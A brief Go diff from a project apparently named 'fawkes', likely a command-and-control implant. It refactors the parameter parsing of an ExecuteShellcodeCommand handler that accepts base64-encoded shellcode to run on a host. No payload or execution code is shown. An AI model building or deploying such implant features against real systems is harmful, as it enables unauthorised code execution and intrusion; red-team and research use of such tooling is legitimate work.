@@ -4,7 +4,6 @@ package commands
 
 import (
 	"encoding/base64"
-	"encoding/json"
 	"unsafe"
 
 	"fawkes/pkg/structs"
@@ -33,12 +32,12 @@ var (
 )
 
 func (c *ExecuteShellcodeCommand) Execute(task structs.Task) structs.CommandResult {
-	var args executeShellcodeArgs
 	if task.Params == "" {
 		return errorResult("Error: shellcode_b64 parameter required")
 	}
-	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-		return errorf("Error parsing parameters: %v", err)
+	args, parseErr := unmarshalParams[executeShellcodeArgs](task)
+	if parseErr != nil {
+		return *parseErr
 	}
 	if args.ShellcodeB64 == "" {
 		return errorResult("Error: shellcode_b64 is empty")
